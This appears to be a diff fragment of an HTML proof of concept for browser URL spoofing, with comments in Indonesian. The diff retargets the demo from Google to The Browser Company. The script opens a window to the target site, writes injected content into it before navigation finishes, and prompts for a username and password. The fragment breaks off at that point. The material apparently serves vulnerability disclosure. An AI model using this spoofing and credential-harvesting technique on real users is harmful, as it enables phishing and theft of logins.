@@ -27,13 +27,13 @@
   <script>
     function spoof() {
       // Buka page baru pointing ke target (akan menjadi spoofed URL)
-      let win = window.open("https://www.google.com/", "_blank");
+      let win = window.open("https://thebrowser.company/", "_blank");
 
       // Setelah 50ms, injeksikan konten sebelum navigasi selesai
       setTimeout(() => {
         try {
           win.document.write(`
-  <h1>This is not Google!</h1>
+  <h1>This is not The Browser Company!</h1>
 <button onclick="
   let username = prompt('Enter your username');
   let password = prompt('Enter your password');
